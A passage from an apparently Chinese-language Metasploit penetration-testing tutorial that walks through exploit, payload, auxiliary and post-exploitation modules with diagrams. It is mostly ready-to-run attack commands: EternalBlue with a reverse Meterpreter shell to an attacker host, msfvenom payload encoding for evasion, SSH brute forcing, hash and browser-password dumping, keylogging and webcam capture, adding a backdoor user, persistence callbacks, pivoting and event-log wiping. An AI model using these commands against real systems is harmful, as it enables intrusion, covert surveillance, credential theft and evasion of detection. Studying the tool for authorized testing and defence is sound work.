font-family="Consolas,Monospace">- schtasks /create</text>  <text x="42" y="756" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- sc create backdoor</text>  <rect x="385" y="594" width="335" height="220.39999999999998" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6"/>  <rect x="385" y="594" width="335" height="30" rx="10" fill="#10b981" opacity="0.22"/>  <text x="395" y="614" font-size="13" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">⑥键鼠/屏幕</text>  <text x="397" y="642" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- screenshot</text>  <text x="397" y="661" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- webcam_list/snap/stream</text>  <text x="397" y="680" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- record_mic</text>  <text x="397" y="699" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- keyscan_start/dump/stop</text>  <text x="397" y="718" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- post/windows/capture</text>  <text x="397" y="737" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- uictl enable keyb/mouse</text>  <text x="397" y="756" font-size="10" fill="#e2e8f0" font-family="Consolas,Monospace">- load espia screengrab</text>  <text x="540.0" y="495" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">Meterpreter 支持 Tab 补全；load stdapi/kiwi/priv/espia 扩展更多</text>
</svg>


### 3.8.1 Exploit（漏洞利用模块）

#### 按平台分类

**Windows漏洞：**
```
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/http/iis_webdav_upload
exploit/windows/dcerpc/ms08_067_netapi
exploit/windows/local/bypassuac
```

**Linux漏洞：**
```
exploit/linux/http/apache_mod_cgi_bash_env
exploit/linux/local/kernel_overlayfs
exploit/multi/http/struts2_content_type_ognl
```

**Web漏洞：**
```
exploit/multi/http/tomcat_mgr_upload
exploit/multi/http/jenkins_script_console
exploit/multi/http/wp_plugin_revslider_upload
```

#### 使用流程

```msf
# 1. 搜索模块
search smb

# 2. 选择模块
use exploit/windows/smb/ms17_010_eternalblue

# 3. 查看信息
show info

# 4. 设置参数
set RHOSTS 192.168.1.1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100

# 5. 执行
run
```

### 3.8.2 Payload（攻击载荷模块）

#### Meterpreter Payload详解

Meterpreter是最强大的Payload，提供丰富的功能。

**优点：**
- 内存运行，不写入硬盘
- 功能丰富
- 可扩展
- 隐蔽性强

**常用Meterpreter Payload：**

| Payload | 说明 |
|------|------|
| windows/meterpreter/reverse_tcp | Windows反向TCP连接 |
| windows/meterpreter/bind_tcp | Windows正向TCP连接 |
| windows/x64/meterpreter/reverse_tcp | 64位Windows版本 |
| linux/x86/meterpreter/reverse_tcp | Linux版本 |

#### 其他Payload

| Payload | 说明 |
|------|------|
| windows/shell/reverse_tcp | 普通反向Shell |
| windows/exec | 执行命令 |
| windows/download_exec | 下载并执行 |
| generic/shell_reverse_tcp | 通用反向Shell |

### 3.8.3 Auxiliary（辅助模块）

#### Scanner扫描模块

**端口扫描：**
```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1
run
```

**服务扫描：**
```msf
use auxiliary/scanner/smb/smb_version
run
```

**SSH扫描：**
```msf
use auxiliary/scanner/ssh/ssh_version
run
```

#### 密码爆破模块

**SSH爆破：**
```msf
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USERNAME root
set PASSWORD password
run
```

**MySQL爆破：**
```msf
use auxiliary/scanner/mysql/mysql_login
run
```

#### 信息收集模块

**SMB信息收集：**
```msf
use auxiliary/scanner/smb/smb_enumshares
run
```

**HTTP信息收集：**
```msf
use auxiliary/scanner/http/http_dirscan
run
```

### 3.8.4 Post（后渗透模块）

#### 信息收集

**收集系统信息：**
```msf
use post/windows/gather/enum_system
set SESSION 1
run
```

**收集网络信息：**
```msf
use post/windows/gather/enum_network
run
```

#### 权限提升

**绕过UAC：**
```msf
use exploit/windows/local/bypassuac
set SESSION 1
run
```

#### 密码获取

**获取系统密码哈希：**
```msf
use post/windows/gather/hashdump
set SESSION 1
run
```

**获取浏览器密码：**
```msf
use post/windows/gather/enum_chrome
run
```

### 3.8.5 Encoder（编码器模块）

#### 使用编码器

在生成Payload时使用编码器：
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.1.100 -f exe -o encoded.exe
```

在exploit中设置编码器：
```msf
set Encoder x86/shikata_ga_nai
```

### 3.8.6 Nops（空指令模块）

空指令用于填充和稳定Payload，通常不需要手动设置。

---

## 3.9 Meterpreter 会话管理详解


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s15g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s15b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s15r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s15a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s15s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s15g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-15 后渗透四阶段闭环：拿下 Meterpreter 只是开始</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">1台 -&gt; 提权 -&gt; 抓哈希 -&gt; 横向 -&gt; 100台 -&gt; 后门 -&gt; 擦痕</text>  <rect x="460.0" y="100.0" width="160" height="80" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="2"/>  <text x="540.0" y="124.0" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">①信息再深挖</text>  <text x="470.0" y="144.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· whoami /priv</text>  <text x="470.0" y="158.0" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· systeminfo</text>  <path d="M494.3492872178326,173.1671842700025 L433.4816701749428,217.39009663000587" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="4 4"/>  <rect x="307.8309573927754" y="210.5572809000084" width="160" height="80" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="2"/>  <text x="387.8309573927754" y="234.5572809000084" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">②权限提升</text>  <text x="317.8309573927754" y="254.5572809000084" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· getsystem 4管道</text>  <text x="317.8309573927754" y="268.55728090000844" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· CVE-2024-本地提权</text>  <path d="M405.26797806490407,304.22291236000336 L428.5173389610756,375.77708763999664" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="4 4"/>  <rect x="365.95435963320426" y="389.44271909999156" width="160" height="80" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="2"/>  <text x="445.95435963320426" y="413.44271909999156" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③凭证抓取</text>  <text x="375.95435963320426" y="433.44271909999156" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· hashdump SAM+SYSTEM</text>  <text x="375.95435963320426" y="447.44271909999156" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· load kiwi sekurlsa</text>  <path d="M502.38174385328165,429.44271909999156 L577.6182561467182,429.4427190999916" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="4 4"/>  <rect x="554.0456403667956" y="389.4427190999916" width="160" height="80" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="2"/>  <text x="634.0456403667956" y="413.4427190999916" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">④横向移动</text>  <text x="564.0456403667956" y="433.4427190999916" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· cme smb网段 -u -H NTLM</text>  <text x="564.0456403667956" y="447.4427190999916" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· psexec.py 哈希</text>  <path d="M651.4826610389243,375.7770876399967 L674.7320219350959,304.2229123600034" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)" stroke-dasharray="4 4"/>  <rect x="612.1690426072246" y="210.55728090000844" width="160" height="80" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>  <text x="692.1690426072246" y="234.55728090000844" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">⑤权限维持</text>  <text x="622.1690426072246" y="254.55728090000844" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· run persistence -U</text>  <text x="622.1690426072246" y="268.55728090000844" font-size="9" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">· schtasks 计划任务</text>  <circle cx="540" cy="300" r="60" fill="#1e293b" stroke="#fde68a" stroke-dasharray="5 4"/>  <text x="540" y="296" text-anchor="middle" font-size="13" font-weight="800" fill="#fde68a" font-family="Microsoft YaHei,Arial">内网</text>  <text x="540" y="314" text-anchor="middle" font-size="13" font-weight="800" fill="#fde68a" font-family="Microsoft YaHei,Arial">渗透</text>  <text x="540" y="332" text-anchor="middle" font-size="13" font-weight="800" fill="#fde68a" font-family="Microsoft YaHei,Arial">循环</text>  <text x="540.0" y="505" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">闭环循环：每次横向新机器=再次①-&gt;②-&gt;③-&gt;④-&gt;⑤，滚雪球拿下整个内网</text>
</svg>


### Meterpreter 基本命令

进入Meterpreter会话后，可以使用各种命令。

#### 系统信息命令

| 命令 | 说明 |
|------|------|
| sysinfo | 显示系统信息 |
| getuid | 显示当前用户 |
| getpid | 显示当前进程ID |
| ps | 显示进程列表 |
| execute | 执行命令 |

**示例：**
```
meterpreter > sysinfo
Computer        : TARGET-PC
OS              : Windows 10 (10.0 Build 19041).
Architecture    : x64
System Language : zh_CN
Meterpreter     : x86/windows
```

#### 文件操作命令

| 命令 | 说明 |
|------|------|
| ls | 列出文件 |
| cd | 切换目录 |
| pwd | 显示当前目录 |
| cat | 查看文件内容 |
| download | 下载文件 |
| upload | 上传文件 |
| edit | 编辑文件 |
| rm | 删除文件 |
| mkdir | 创建目录 |

**示例：**
```
meterpreter > ls
Listing: C:\Users\Admin
========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2024-01-01 10:00:00  Desktop
40777/rwxrwxrwx   0     dir   2024-01-01 10:00:00  Documents
```

#### 网络命令

| 命令 | 说明 |
|------|------|
| ipconfig | 显示网络配置 |
| netstat | 显示网络连接 |
| route | 显示路由表 |
| portfwd | 端口转发 |
| arp | 显示ARP表 |

**端口转发示例：**
```
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.2
```
将目标80端口转发到本地8080端口。

#### 摄像头和麦克风命令

| 命令 | 说明 |
|------|------|
| webcam_list | 列出摄像头 |
| webcam_snap | 拍照 |
| record_mic | 录音 |

**拍照示例：**
```
meterpreter > webcam_snap -i 1 -v false
[*] Got webcam list
[*] Started...
[*] Captured 1 frame
[*] Stopped
Webcam shot saved to: /root/proof.jpeg
```

#### 键盘记录命令

| 命令 | 说明 |
|------|------|
| keyscan_start | 开始键盘记录 |
| keyscan_stop | 停止键盘记录 |
| keyscan_dump | 导出键盘记录 |

**示例：**
``
meterpreter > keyscan_start
Starting keystroke capture...
meterpreter > keyscan_dump
Dumping captured keystrokes...
Hello, this is what the user typed.
```

#### 屏幕截图命令

```
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg
```

---

## 3.10 后渗透攻击技术详解


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 520" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s16g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s16b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s16r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s16a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s16s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s16g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-16 Armitage 图形界面四大区 + 工作流程</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">可视化点击式打 MSF，适合批量内网打点 / 演示</text>  <rect x="40" y="120" width="470" height="210" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="2.2" stroke-dasharray="6 3"/>  <rect x="40" y="120" width="180" height="26" rx="10" fill="#0ea5e9" opacity="0.22"/>  <text x="130" y="137" text-anchor="middle" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">A 主机拓扑区 (Hosts)</text>  <text x="52" y="168" font-size="11.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">左上 · 存活主机/OS/图标，右键 Attack 一键打</text>  <rect x="40" y="340" width="470" height="130" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="2.2" stroke-dasharray="6 3"/>  <rect x="40" y="340" width="180" height="26" rx="10" fill="#8b5cf6" opacity="0.22"/>  <text x="130" y="357" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">B 模块浏览区 (Modules)</text>  <text x="52" y="388" font-size="11.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">左下 · 按 Exploit/Aux/Post 分类树点击加载</text>  <rect x="530" y="120" width="510" height="240" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="2.2" stroke-dasharray="6 3"/>  <rect x="530" y="120" width="180" height="26" rx="10" fill="#a855f7" opacity="0.22"/>  <text x="620" y="137" text-anchor="middle" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">C 攻击结果区 (Console)</text>  <text x="542" y="168" font-size="11.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">右大 · 所有 msfconsole 日志/交互输出可见</text>  <rect x="530" y="370" width="510" height="100" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="2.2" stroke-dasharray="6 3"/>  <rect x="530" y="370" width="180" height="26" rx="10" fill="#10b981" opacity="0.22"/>  <text x="620" y="387" text-anchor="middle" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">D 会话标签区 (Sessions)</text>  <text x="542" y="418" font-size="11.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">右下 · 每台机器打开的 Shell/Meterpreter 切签</text>  <path d="M275,330 L275,340" stroke="#ef4444" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="275.0" y="330.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">右键 Attack</text>  <path d="M510,225.0 L530,240.0" stroke="#f59e0b" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="520.0" y="227.5" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">结果输出</text>  <path d="M785.0,360 L785.0,370" stroke="#10b981" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="785.0" y="360.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">会话创建</text>  <text x="540.0" y="495" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">Armitage 适合内网多主机批量打点+可视化；底层实际就是 msfconsole RPC</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s21g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s21b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s21r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s21a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s21s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s21g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-21 Sessions 多会话管理 8 个高频操作</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">批量拿下 50+ 机器时，sessions 命令是你唯一的管理入口</text>  <rect x="60" y="140" width="180" height="126" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2"/>  <text x="150" y="162" text-anchor="middle" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">1 列出所有会话</text>  <line x1="70" y1="178" x2="230" y2="178" stroke="#334155"/>  <text x="150" y="202" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -l</text>  <text x="150" y="218" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="70" y1="234" x2="230" y2="234" stroke="#334155"/>  <text x="70" y="252" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">展示 ID/类型/目标 IP/用户名/时间</text>  <rect x="250" y="140" width="180" height="126" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2"/>  <text x="340" y="162" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">2 进入指定会话</text>  <line x1="260" y1="178" x2="420" y2="178" stroke="#334155"/>  <text x="340" y="202" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -i 3</text>  <text x="340" y="218" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="260" y1="234" x2="420" y2="234" stroke="#334155"/>  <text x="260" y="252" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">进入 ID=3 的 meterpreter shell</text>  <rect x="440" y="140" width="180" height="126" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>  <text x="530" y="162" text-anchor="middle" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">3 杀掉会话</text>  <line x1="450" y1="178" x2="610" y2="178" stroke="#334155"/>  <text x="530" y="202" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -k 3</text>  <text x="530" y="218" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="450" y1="234" x2="610" y2="234" stroke="#334155"/>  <text x="450" y="252" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">断开某会话，目标端不报错</text>  <rect x="630" y="140" width="180" height="126" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>  <text x="720" y="162" text-anchor="middle" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">4 批量升级 shell-&gt;meterpreter</text>  <line x1="640" y1="178" x2="800" y2="178" stroke="#334155"/>  <text x="720" y="202" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -u 2 -t 443</text>  <text x="720" y="218" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="640" y1="234" x2="800" y2="234" stroke="#334155"/>  <text x="640" y="252" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">普通 cmd shell 升级为 Meterpreter</text>  <rect x="60" y="310" width="180" height="126" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2"/>  <text x="150" y="332" text-anchor="middle" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">5 批量命令群发</text>  <line x1="70" y1="348" x2="230" y2="348" stroke="#334155"/>  <text x="150" y="372" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -c "whoami &amp; hostna</text>  <text x="150" y="388" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">me"</text>  <line x1="70" y1="404" x2="230" y2="404" stroke="#334155"/>  <text x="70" y="422" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">同时所有会话执行一条命令</text>  <rect x="250" y="310" width="180" height="126" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2"/>  <text x="340" y="332" text-anchor="middle" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">6 命名会话</text>  <line x1="260" y1="348" x2="420" y2="348" stroke="#334155"/>  <text x="340" y="372" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -n "DC-01" -i 1</text>  <text x="340" y="388" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="260" y1="404" x2="420" y2="404" stroke="#334155"/>  <text x="260" y="422" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">改名字防止认不出哪台是 DC</text>  <rect x="440" y="310" width="180" height="126" rx="12" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>  <text x="530" y="332" text-anchor="middle" font-size="12" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">7 后台/前台</text>  <line x1="450" y1="348" x2="610" y2="348" stroke="#334155"/>  <text x="530" y="372" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">background / sessions -i 1</text>  <text x="530" y="388" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="450" y1="404" x2="610" y2="404" stroke="#334155"/>  <text x="450" y="422" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Ctrl+Z 也能后台当前会话</text>  <rect x="630" y="310" width="180" height="126" rx="12" fill="#0f172a" stroke="#ec4899" stroke-width="2"/>  <text x="720" y="332" text-anchor="middle" font-size="12" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">8 导出 loot/creds</text>  <line x1="640" y1="348" x2="800" y2="348" stroke="#334155"/>  <text x="720" y="372" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace">sessions -C loot -v</text>  <text x="720" y="388" text-anchor="middle" font-size="10.5" fill="#fde68a" font-family="Consolas,Monospace"></text>  <line x1="640" y1="404" x2="800" y2="404" stroke="#334155"/>  <text x="640" y="422" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">一次性导出所有会话的战利品</text>  <rect x="60" y="460" width="960" height="36" rx="8" fill="#020617" stroke="#dc2626"/>  <text x="80" y="483" font-size="12" fill="#fecaca" font-family="Microsoft YaHei,Arial">⚠ 拿了域控不要直接 sessions -k * 断线！先 hashdump + 导出 NTDS.dit，再 sessions -C "cmd.exe /c hostname" 批量巡检后再处理</text>  <text x="540.0" y="520" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">多会话管理是区分新手和老手的第一指标；-c 批量命令写报告能省 3 小时</text>
</svg>


### 信息收集

#### 收集系统信息

```
meterpreter > run post/windows/gather/enum_system
```

收集内容包括：
- 系统版本
- 安装软件
- 服务列表
- 用户列表

#### 收集密码信息

**系统密码哈希：**
```
meterpreter > run post/windows/gather/hashdump
```

**浏览器密码：**
```
meterpreter > run post/windows/gather/enum_chrome
meterpreter > run post/multi/gather/firefox_creds
```

**WiFi密码：**
```
meterpreter > run post/windows/wlan/wlan_profile
```

### 权限维持

#### 添加用户

```
meterpreter > run post/windows/manage/add_user USERNAME=hacker PASSWORD=password123
```

#### 安装后门

```
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.100
```

参数说明：
- `-U`：用户登录时启动
- `-i`：间隔时间
- `-p`：端口
- `-r`：IP

### 横向移动

#### 内网探测

**发现内网主机：**
```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24
```

**端口扫描：**
```
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=192.168.1.2
```

#### 跳板攻击

**添加路由：**
```
meterpreter > run autoroute -s 192.168.2.0/24
```

这样可以通过Meterpreter会话访问内网其他主机。

### 痕迹清理

#### 清除日志

```
meterpreter > clearev
```

清除Windows事件日志。

---

## 3.11 Armitage 图形化界面使用


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 510" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s17g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s17b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s17r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s17a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s17s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s17g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-17 MS17-010 永恒之蓝实战 6 步全流程</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">SMB 445 端口 -&gt; MS17-010 scanner -&gt; eternalblue -&gt; meterpreter -&gt; hashdump -&gt; 横向</text>  <rect x="40" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2.2"/>  <text x="120" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 扫描 445 端口</text>  <line x1="50" y1="232" x2="190" y2="232" stroke="#334155"/>  <text x="120" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">nmap -sS -p445 10.0.0.0/24</text>  <text x="120" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <text x="120" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M200,245 L210,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="205.0" y="240.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">1-&gt;2</text>  <rect x="210" y="190" width="160" height="110" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2.2"/>  <text x="290" y="216" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">② 漏洞检测</text>  <line x1="220" y1="232" x2="360" y2="232" stroke="#334155"/>  <text x="290" y="252" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">use auxiliary/scanner/smb/smb_</text>  <text x="290" y="268" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">ms17_010</text>  <text x="290" y="284" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace"></text>  <path d="M370,245 L380,245" stroke="#60a5fa" stroke-width="2.3" fill="none" marker-end="url(#s01a)"/>  <text x="375.0" y="240.0" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Microsoft 